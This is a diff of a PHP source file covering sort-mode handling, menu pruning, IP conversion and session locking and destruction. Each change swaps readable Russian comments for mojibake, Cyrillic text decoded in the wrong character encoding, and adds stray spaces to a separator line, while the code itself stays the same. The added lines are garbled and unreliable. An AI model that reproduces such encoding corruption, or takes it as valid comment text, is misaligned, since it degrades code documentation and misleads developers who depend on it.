 function assocateSortMode($sm)
 {
-  $GLOBALS['_sortColumn']    = $sm[0]; //Колонка
-  $GLOBALS['_sortColumnId'] = 0; //ID колонки.
-  $GLOBALS['_sortOrder']     = 0; //Направление, 0 = ASC, 1 = DESC
+  $GLOBALS['_sortColumn']    = $sm[0]; //RљRѕR "RѕRЅRєR °
+  $GLOBALS['_sortColumnId'] = 0; //ID RєRѕR "RѕRЅRєRe.
+  $GLOBALS['_sortOrder']     = 0; //RќR ° ° RїSЂR RІR "RμRЅReRμ, 0 = ASC, 1 = DESC
 
   if(!empty($_GET['smode']) && is_numeric($_GET['smode']))
   {
@@ -1244,7 +1244,7 @@ function optimizeMenu(&$menu, $saveFSep)
 {
   foreach($menu as $key => $item)foreach($item[2] as $r)if(empty($GLOBALS['userData'][$r])){unset($menu[$key]); break;}
 
-  //Удаляем лишнии разделители.
+  //RЈRґR ° P "SЏRμRј R" Res € RЅReRe SЂR ° F · RґRμR "Res, RμR" Fe.
   $sep = -1;
   $i = 0;
   foreach($menu as $key => $item)
@@ -1278,9 +1278,9 @@ function binaryIpToString($ip)
   return @long2ip($ip[1]);
 }
 
-//////////////////////////////////////////////////////////////////////////////////////////////////
-// Управление сессией.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / //////////////////////////////////////////////
+// RЈRїSЂR ° RІR "RμRЅReRμ SЃRμSЃSЃReRμR №.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Захват сессии
@@ -1304,9 +1304,7 @@ function unlockSession()
   if($GLOBALS['_sessionRef'] > 0 && --$GLOBALS['_sessionRef'] == 0)session_write_close();
 }
 
-/*
-  Уничтожение сессии
-*/
+/*  RЈRЅReS ‡ C ¶ RѕR RμRЅReRμ SЃRμSЃSЃReRe*/
 function unlockSessionAndDestroyAllCokies()
 {
   $GLOBALS['_sessionRef'] = 0;
